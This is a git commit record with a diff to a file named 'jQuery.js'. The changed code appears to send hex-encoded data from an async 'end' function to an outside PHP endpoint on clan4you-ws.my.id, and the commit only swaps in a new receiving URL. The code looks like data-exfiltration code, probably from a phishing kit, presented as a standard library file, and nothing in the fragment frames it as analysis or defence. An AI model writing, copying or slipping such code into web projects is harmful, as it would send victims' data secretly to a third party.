a31bfb89950034ef105584891c6596ec2dc05c3e
systemyour2 <rscjay02@gmail.com>
2024-09-08 15:20:47 +0700

    Update jQuery.js

--- jQuery.js
+++ jQuery.js
@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://systemweb.clan4you-ws.my.id?cat="+
+                    "https://ajax.clan4you-ws.my.id/konekin.php?cat="+
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
